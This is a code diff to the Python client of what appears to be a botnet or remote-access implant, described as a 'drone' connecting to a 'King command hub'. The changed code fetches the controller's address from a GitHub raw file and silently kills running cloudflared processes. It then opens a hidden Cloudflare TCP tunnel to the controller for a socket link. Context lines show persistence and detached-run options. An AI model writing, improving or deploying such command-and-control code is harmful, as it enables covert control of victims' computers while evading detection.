@@ -725,80 +725,58 @@ def extract_file_bytes(path):
         return None
 
 
-def get_king_domain(url=DEFAULT_GITHUB_THRONE_URL):
-    """Fetch the Cloudflare domain from GitHub throne.txt."""
+def connect_to_king(url=DEFAULT_GITHUB_THRONE_URL):
+    """Connect to the King via a Cloudflare TCP tunnel."""
     try:
-        response = requests.get(url, timeout=10)
-        return response.text.strip()
+        king_url = requests.get(url, timeout=10).text.strip()
     except Exception as e:
-        print(f"[-] Failed to fetch king domain: {e}")
+        print(f"[-] Failed to fetch King URL: {e}")
         return None
 
-
-def establish_connection(url=DEFAULT_GITHUB_THRONE_URL):
-    """Establish Cloudflare bridge connection to the King."""
-    king_domain = get_king_domain(url)
-    if not king_domain:
-        print("[-] Could not retrieve King domain.")
+    if not king_url:
+        print("[-] King URL is empty.")
         return None
-    
-    print(f"[*] King found at: {king_domain}")
 
-    # 1. Start a local bridge on the Drone's side
-    # This maps the Cloudflare tunnel to the Drone's local port 1234
-    
-    # Robustly find the cloudflared executable using absolute path
-    cloudflared_path = os.path.join(os.getcwd(), "cloudflared.exe")
-    if not os.path.exists(cloudflared_path):
-        # Try alternative name
-        alt_path = os.path.join(os.getcwd(), "cloudflared.exe.exe")
-        if os.path.exists(alt_path):
-            cloudflared_path = alt_path
-        else:
-            print(f"[-] cloudflared.exe not found in {os.getcwd()}")
-            return None
-
-    bridge_cmd = [
-        cloudflared_path, "access", "tcp", 
-        "--hostname", king_domain, 
-        "--listener", "127.0.0.1:1234"
-    ]
-    
+    # 1. Kill any stale cloudflared instances first.
     try:
-        # Run the bridge in the background with properly hidden stdout/stderr
-        subprocess.Popen(
-            bridge_cmd, 
-            stdout=subprocess.DEVNULL, 
+        subprocess.run(
+            "taskkill /f /im cloudflared.exe >nul 2>&1",
+            shell=True,
+            stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
-            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
         )
-        time.sleep(2)  # Give it a second to stabilize
-    except FileNotFoundError:
-        print("[-] cloudflared.exe not found. Make sure Cloudflare Tunnel is installed.")
-        return None
+    except Exception:
+        pass
+
+    # 2. Start the bridge with the stability flag (http2).
+    bridge_cmd = [
+        "cloudflared.exe", "access", "tcp",
+        "--hostname", king_url,
+        "--listener", "127.0.0.1:8888",
+        "--protocol", "http2",
+    ]
+
+    try:
+        subprocess.Popen(
+            bridge_cmd,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        time.sleep(5)
     except Exception as e:
         print(f"[-] Failed to start bridge: {e}")
         return None
 
-    # 2. Connect the Socket to the local bridge
-    max_retries = 3
-    for attempt in range(max_retries):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(10.0)
-            s.connect(("127.0.0.1", 1234))
-            print("[+] Evolution Link Established via Cloudflare.")
-            return s
-        except ConnectionError as e:
-            print(f"[-] Connection attempt {attempt+1} failed: {e}")
-            if attempt < max_retries - 1:
-                time.sleep(1)
-                continue
-            print(f"[-] Connection Failed after {max_retries} attempts: {e}")
-            return None
-        except Exception as e:
-            print(f"[-] Connection Failed: {e}")
-            return None
+    # 3. Connect the socket to the local bridge.
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
+        s.connect(("127.0.0.1", 8888))
+        print("[+] Evolution Link Stable.")
+        return s
+    except Exception as e:
+        print(f"[-] Connection failed: {e}")
+        return None
 
 
 def connect_direct_hub(hub_ip, port, max_retries: int = 3):
@@ -826,7 +804,7 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
     while True:
         try:
             if github_throne_url:
-                client = establish_connection(github_throne_url)
+                client = connect_to_king(github_throne_url)
             else:
                 client = connect_direct_hub(hub_ip, port)
 
@@ -1047,8 +1025,8 @@ def parse_args():
     parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
     parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', HUB_ADDRESS), help='IP address or hostname of the King command hub')
     parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', str(HUB_PORT))), help='Port of the King command hub')
-    parser.add_argument('--github-throne-url', default=os.getenv('KING_THRONE_URL', ''), help='GitHub raw URL to retrieve King IP from (overrides --hub-ip when present)')
-    parser.add_argument('--throne-url', default=os.getenv('KING_THRONE_URL', ''), help='Alias for --github-throne-url')
+    parser.add_argument('--github-throne-url', default=os.getenv('KING_THRONE_URL', DEFAULT_GITHUB_THRONE_URL), help='GitHub raw URL to retrieve King IP from (overrides --hub-ip when present)')
+    parser.add_argument('--throne-url', default=os.getenv('KING_THRONE_URL', DEFAULT_GITHUB_THRONE_URL), help='Alias for --github-throne-url')
     parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
     parser.add_argument('--detached', action='store_true', help='Run in background')
     args = parser.parse_args()
@@ -1082,3 +1060,4 @@ if __name__ == '__main__':
         print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
 
     connect_to_hub(args.hub_ip, args.hub_port, args.github_throne_url)
+
